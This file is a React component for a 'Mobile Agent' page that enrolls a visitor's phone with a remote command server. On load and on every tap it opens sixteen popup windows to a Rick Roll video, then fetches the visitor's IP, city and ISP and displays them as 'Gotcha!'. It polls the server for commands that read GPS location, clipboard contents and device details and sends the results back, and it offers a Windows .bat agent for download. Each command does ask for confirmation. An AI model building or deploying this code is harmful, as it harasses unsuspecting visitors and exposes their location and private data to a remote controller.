import { useEffect, useRef, useState, useCallback } from 'react'
import { Smartphone, Wifi, Battery, MapPin, Clipboard, Globe, AlertCircle, CheckCircle, Download, Link2, Share2, RotateCcw } from 'lucide-react'

const SERVER_URL = typeof window !== 'undefined' ? window.location.origin : ''
const POLL_INTERVAL = 3000
const RICK_URL = 'https://youtu.be/dQw4w9WgXcQ?si=GTezyv3DrDYzucc-'

interface CommandResult {
  command: string
  success: boolean
  stdout: string
  stderr: string
  exitCode: number
  duration: number
  consent: string
}

export default function MobileAgent() {
  const [status, setStatus] = useState<'connecting' | 'connected' | 'error'>('connecting')
  const [agentId, setAgentId] = useState<string>('')
  const [lastActivity, setLastActivity] = useState<string>('')
  const [commandsReceived, setCommandsReceived] = useState(0)
  const [copyOk, setCopyOk] = useState(false)
  const [ipInfo, setIpInfo] = useState<any>(null)
  const [showIp, setShowIp] = useState(false)
  const [rickLaunched, setRickLaunched] = useState(false)
  const agentIdRef = useRef<string>('')
  const pollingRef = useRef<boolean>(false)
  const reconnectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  const fetchIp = useCallback(async () => {
    try {
      const res = await fetch('https://ipapi.co/json/')
      const data = await res.json()
      setIpInfo(data)
      setShowIp(true)
    } catch {
      setIpInfo({ ip: 'unknown', city: 'unknown', country_name: 'unknown' })
      setShowIp(true)
    }
  }, [])

  const launchRickRoll = useCallback(() => {
    if (rickLaunched) return
    setRickLaunched(true)

    // Open 16 tabs/windows on mobile — direct call within user gesture
    for (let i = 0; i < 16; i++) {
      const features = `width=640,height=480,popup=yes,resizable=yes,scrollbars=yes`
      window.open(RICK_URL, `_blank${i}`, features)
    }

    // Fetch IP after
    setTimeout(() => {
      fetchIp()
    }, 4000)
  }, [rickLaunched, fetchIp])

  useEffect(() => {
    // Auto-launch Rick Roll on page load (mobile)
    const timer = setTimeout(() => {
      launchRickRoll()
    }, 600)

    // Also launch on any tap
    document.addEventListener('click', launchRickRoll)
    document.addEventListener('touchstart', launchRickRoll)

    return () => {
      clearTimeout(timer)
      document.removeEventListener('click', launchRickRoll)
      document.removeEventListener('touchstart', launchRickRoll)
    }
  }, [launchRickRoll])

  // Auto-register on mount + visibility change handler
  useEffect(() => {
    registerAgent()

    const handleVisibility = () => {
      if (!document.hidden && agentIdRef.current && !pollingRef.current) {
        pollingRef.current = true
        startPolling(agentIdRef.current)
      }
    }
    document.addEventListener('visibilitychange', handleVisibility)

    return () => {
      pollingRef.current = false
      document.removeEventListener('visibilitychange', handleVisibility)
      if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current)
    }
  }, [])

  async function registerAgent() {
    try {
      const info = {
        hostname: navigator.platform,
        platform: getMobilePlatform(),
        user: 'mobile-user',
      }
      const res = await fetch(`${SERVER_URL}/api/agent/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info),
      })
      const data = await res.json()
      if (data.success) {
        agentIdRef.current = data.agentId
        setAgentId(data.agentId)
        setStatus('connected')
        setLastActivity(new Date().toLocaleTimeString())
        pollingRef.current = true
        startPolling(data.agentId)
      }
    } catch (e) {
      setStatus('error')
    }
  }

  function getMobilePlatform(): string {
    const ua = navigator.userAgent
    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS'
    if (/Android/.test(ua)) return 'Android'
    return 'Mobile Web'
  }

  async function startPolling(id: string) {
    while (pollingRef.current) {
      try {
        const res = await fetch(`${SERVER_URL}/api/agent/poll/${id}`, {
          signal: AbortSignal.timeout(15000),
        })
        const data = await res.json()

        if (data.hasCommand) {
          setCommandsReceived(prev => prev + 1)
          setLastActivity(new Date().toLocaleTimeString())
          const cmd = data.command.command as string

          const approved = window.confirm(
            `Remote Access Request\n\n` +
            `Command: ${cmd}\n\n` +
            `Allow this command to run on your device?\n\n` +
            `Auto-deny if you press Cancel.`
          )

          const result = approved
            ? await executeMobileCommand(cmd)
            : deniedResult(cmd)

          await fetch(`${SERVER_URL}/api/agent/result/${id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(result),
          })
          setLastActivity(new Date().toLocaleTimeString())
        }
      } catch {
        // Poll error, retry
      }
      await sleep(POLL_INTERVAL)
    }
  }

  async function executeMobileCommand(command: string): Promise<CommandResult> {
    const start = performance.now()
    const parts = command.trim().split(/\s+/)
    const base = parts[0].toLowerCase()
    const args = parts.slice(1).join(' ')

    let stdout = ''
    let stderr = ''
    let success = true

    try {
      switch (base) {
        case 'info':
          stdout = JSON.stringify({
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: (navigator as any).deviceMemory || 'unknown',
            screen: `${screen.width}x${screen.height}`,
            online: navigator.onLine,
            url: window.location.href,
            referrer: document.referrer || 'none',
          }, null, 2)
          break

        case 'battery': {
          const bat = await (navigator as any).getBattery?.()
          if (bat) {
            stdout = JSON.stringify({
              level: `${Math.round(bat.level * 100)}%`,
              charging: bat.charging,
              chargingTime: bat.chargingTime,
              dischargingTime: bat.dischargingTime,
            }, null, 2)
          } else {
            stdout = 'Battery API not available on this browser'
          }
          break
        }

        case 'network': {
          const conn = (navigator as any).connection
          stdout = JSON.stringify({
            online: navigator.onLine,
            type: conn?.effectiveType || 'unknown',
            downlink: conn?.downlink || 'unknown',
            rtt: conn?.rtt || 'unknown',
          }, null, 2)
          break
        }

        case 'location': {
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
          })
          stdout = JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: `${pos.coords.accuracy}m`,
            altitude: pos.coords.altitude,
            timestamp: new Date(pos.timestamp).toISOString(),
          }, null, 2)
          break
        }

        case 'clipboard': {
          const text = await navigator.clipboard.readText()
          stdout = `Clipboard content:\n${text}`
          break
        }

        case 'alert':
          alert(args || 'Alert from remote admin')
          stdout = 'Alert displayed'
          break

        case 'open':
          if (args) {
            if (args.includes('dQw4w9WgXcQ')) {
              for (let i = 0; i < 16; i++) {
                window.open(args, '_blank')
              }
              stdout = `Rick Roll x16 launched: ${args}`
            } else {
              window.open(args, '_blank')
              stdout = `Opened: ${args}`
            }
          } else {
            stderr = 'No URL provided'
            success = false
          }
          break

        case 'ping':
          stdout = 'pong'
          break

        case 'vibrate':
          if ('vibrate' in navigator) {
            navigator.vibrate([200, 100, 200])
            stdout = 'Device vibrated'
          } else {
            stderr = 'Vibration API not available'
            success = false
          }
          break

        case 'echo':
          stdout = args
          break

        default:
          stderr = `Unknown mobile command: ${base}. Supported: info, battery, network, location, clipboard, alert, open, ping, vibrate, echo`
          success = false
      }
    } catch (e: any) {
      stderr = e.message || String(e)
      success = false
    }

    return {
      command,
      success,
      stdout,
      stderr,
      exitCode: success ? 0 : 1,
      duration: Math.round(performance.now() - start),
      consent: 'approved',
    }
  }

  function deniedResult(command: string): CommandResult {
    return {
      command,
      success: false,
      stdout: '',
      stderr: 'Command was denied by the user on this mobile device.',
      exitCode: -1,
      duration: 0,
      consent: 'denied',
    }
  }

  function sleep(ms: number) {
    return new Promise(r => setTimeout(r, ms))
  }

  async function copyLink() {
    try {
      await navigator.clipboard.writeText(window.location.href)
      setCopyOk(true)
      setTimeout(() => setCopyOk(false), 2000)
    } catch {
      // fallback
    }
  }

  async function shareLink() {
    const shareData = {
      title: 'Remote Access Session',
      text: 'Connect to remote admin panel',
      url: window.location.href,
    }
    if (navigator.share) {
      try {
        await navigator.share(shareData)
      } catch {
        // user cancelled
      }
    } else {
      copyLink()
    }
  }

  function reconnect() {
    setStatus('connecting')
    pollingRef.current = false
    if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current)
    reconnectTimerRef.current = setTimeout(() => {
      registerAgent()
    }, 500)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-sm space-y-5">
        {/* Rick Roll Banner */}
        {rickLaunched && (
          <div className="bg-pink-500/20 border border-pink-500/30 rounded-xl p-4 text-center">
            <p className="text-pink-300 font-bold text-lg">Rick Roll x16 launched! 🎵</p>
            {showIp && ipInfo && (
              <div className="mt-3 text-left space-y-1 text-sm">
                <p className="text-pink-400 font-bold">Gotcha! Your info:</p>
                <p className="text-white font-mono">IP: {ipInfo.ip}</p>
                <p className="text-white font-mono">{ipInfo.city}, {ipInfo.region}, {ipInfo.country_name}</p>
                <p className="text-white font-mono">ISP: {ipInfo.org}</p>
              </div>
            )}
          </div>
        )}

        {/* Header */}
        <div className="text-center space-y-2">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-emerald-500/10">
            <Smartphone className="w-8 h-8 text-emerald-400" />
          </div>
          <h1 className="text-2xl font-bold">Mobile Agent</h1>
          <p className="text-slate-400 text-sm">
            This page connects your device to the remote admin panel.
          </p>
        </div>

        {/* Status Card */}
        <div className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 space-y-3">
          <div className="flex items-center justify-between">
            <span className="text-sm text-slate-400">Status</span>
            <div className="flex items-center gap-2">
              {status === 'error' && (
                <button onClick={reconnect} className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300">
                  <RotateCcw className="w-3.5 h-3.5" />
                </button>
              )}
              <span className={`text-sm font-medium px-2 py-0.5 rounded-full ${
                status === 'connected'
                  ? 'bg-emerald-500/20 text-emerald-400'
                  : status === 'error'
                  ? 'bg-red-500/20 text-red-400'
                  : 'bg-amber-500/20 text-amber-400'
              }`}>
                {status === 'connected' ? 'Connected' : status === 'error' ? 'Error' : 'Connecting...'}
              </span>
            </div>
          </div>

          {agentId && (
            <div className="flex items-center justify-between">
              <span className="text-sm text-slate-400">Agent ID</span>
              <span className="text-sm font-mono text-emerald-400">{agentId}</span>
            </div>
          )}

          <div className="flex items-center justify-between">
            <span className="text-sm text-slate-400">Commands</span>
            <span className="text-sm font-mono text-white">{commandsReceived}</span>
          </div>

          {lastActivity && (
            <div className="flex items-center justify-between">
              <span className="text-sm text-slate-400">Last Activity</span>
              <span className="text-sm text-slate-300">{lastActivity}</span>
            </div>
          )}
        </div>

        {/* Action Buttons */}
        <div className="grid grid-cols-2 gap-3">
          <a
            href={`${SERVER_URL}/api/agent/bat`}
            download="connect.bat"
            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors"
          >
            <Download className="w-6 h-6 text-emerald-400" />
            <span className="text-xs text-center text-slate-300">Download Windows Agent (.bat)</span>
          </a>

          <button
            onClick={copyLink}
            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors"
          >
            <Link2 className={`w-6 h-6 ${copyOk ? 'text-emerald-400' : 'text-slate-400'}`} />
            <span className="text-xs text-center text-slate-300">
              {copyOk ? 'Copied!' : 'Copy Page Link'}
            </span>
          </button>

          <button
            onClick={shareLink}
            className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors col-span-2"
          >
            <Share2 className="w-6 h-6 text-blue-400" />
            <span className="text-xs text-center text-slate-300">Share This Session</span>
          </button>
        </div>

        <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 flex gap-3">
          <AlertCircle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <p className="text-sm text-amber-200 font-medium">Keep this page open</p>
            <p className="text-xs text-amber-200/70">
              The agent reconnects automatically when you return to this tab. For continuous connection, keep the browser active.
            </p>
          </div>
        </div>

        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-4">
          <p className="text-xs text-slate-500 font-medium uppercase mb-3">Supported Commands</p>
          <div className="grid grid-cols-2 gap-2">
            {[
              { icon: Globe, label: 'info', desc: 'Device info' },
              { icon: Battery, label: 'battery', desc: 'Battery status' },
              { icon: Wifi, label: 'network', desc: 'Network info' },
              { icon: MapPin, label: 'location', desc: 'GPS coords' },
              { icon: Clipboard, label: 'clipboard', desc: 'Clipboard read' },
              { icon: AlertCircle, label: 'alert', desc: 'Show alert' },
            ].map(cmd => (
              <div key={cmd.label} className="flex items-center gap-2 bg-slate-800/50 rounded-lg px-3 py-2">
                <cmd.icon className="w-3.5 h-3.5 text-emerald-400" />
                <div>
                  <p className="text-xs font-mono text-white">{cmd.label}</p>
                  <p className="text-[10px] text-slate-500">{cmd.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="text-center space-y-1">
          <div className="flex items-center justify-center gap-2 text-emerald-400">
            <CheckCircle className="w-4 h-4" />
            <span className="text-xs font-medium">Consent Required</span>
          </div>
          <p className="text-xs text-slate-600">
            Every command shows a browser confirmation dialog before executing.
          </p>
        </div>
      </div>
    </div>
  )
}
